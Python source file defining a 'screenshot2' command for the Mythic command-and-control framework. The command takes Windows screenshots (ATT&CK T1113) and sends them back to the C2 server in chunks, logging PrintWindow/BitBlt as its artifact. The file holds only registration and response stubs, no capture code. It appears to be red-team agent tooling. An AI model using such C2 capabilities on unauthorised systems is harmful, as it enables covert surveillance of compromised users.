from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
from datetime import datetime

class Screenshot2Arguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class Screenshot2Command(CommandBase):
    cmd = "screenshot2"
    needs_admin = False
    help_cmd = "screenshot2"
    description = "Captura de tela no Windows e envia a imagem em chunks para o Mythic."
    version = 1
    author = "willian"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = Screenshot2Arguments
    browser_script = BrowserScript(script_name="screenshot2", author="willian", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="user32.PrintWindow / gdi32.BitBlt",
            artifact_type="API Called",
        )
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

